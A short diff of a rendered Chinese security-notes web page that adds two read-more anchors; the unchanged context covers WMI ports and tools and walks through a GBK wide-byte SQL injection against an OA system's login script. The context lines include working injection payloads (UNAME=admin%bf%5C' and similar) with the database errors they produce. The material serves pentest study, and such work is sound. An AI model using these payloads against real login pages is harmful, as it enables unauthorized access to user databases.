@@ -173,6 +173,7 @@
 </ul>
 <p>协议</p>
 <p>DCOM TCP Port 135<br>WinRM TCP Ports 5985 (HTTP) and 5986 (HTTPS).<br>服务 Winmgmt </p>
+<a id="more"></a>
 <h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><ul>
 <li>wmic.exe</li>
 <li>wbemtest.exe</li>
@@ -257,6 +258,7 @@
 <h5 id="TESTING01-发现宽字节注入"><a href="#TESTING01-发现宽字节注入" class="headerlink" title="TESTING01 发现宽字节注入"></a>TESTING01 发现宽字节注入</h5><p><code>PASSWORD=1111&amp;UNAME=1%bf&#39;</code></p>
 <p>#1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1縗’’’ at line 1<br>SQL语句: <code>SELECT * from USER where USER_ID=&#39;1縗&#39;&#39; or BYNAME=&#39;1縗&#39;&#39;</code><br>文件: D:/myoa/webroot/logincheck.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Note</div><div class="line">为了阻止SQL注入，php引入了magic_quotes_gpc，当打开时会对单引号，双引号，反斜线和 NULL字符自动转义。但是当数据库是GBK编码，就会导致宽字节注入。</div><div class="line">转义引号\&apos;</div><div class="line">PASSWORD=123456&amp;UNAME=admin%bf\&apos;</div><div class="line"> ---------------------</div><div class="line">|\ ==&gt; %5C            |</div><div class="line">|当 %bf5c会解码成 縗  |</div><div class="line"> ---------------------</div></pre></td></tr></table></figure>
+<a id="more"></a>
 <h5 id="TESTING02-闭合语句"><a href="#TESTING02-闭合语句" class="headerlink" title="TESTING02 闭合语句"></a>TESTING02 闭合语句</h5><p><code>PASSWORD=123456&amp;UNAME=admin%bf%5C&#39;</code></p>
 <p>SQL语句: <code>SELECT * from USER where USER_ID=&#39;admin縗&#39;&#39; or BYNAME=&#39;admin縗&#39;&#39;</code></p>
 <p>但是系统多加了一个引号’导致语句出错，我们使用#（%23）注释掉后面的语句。</p>
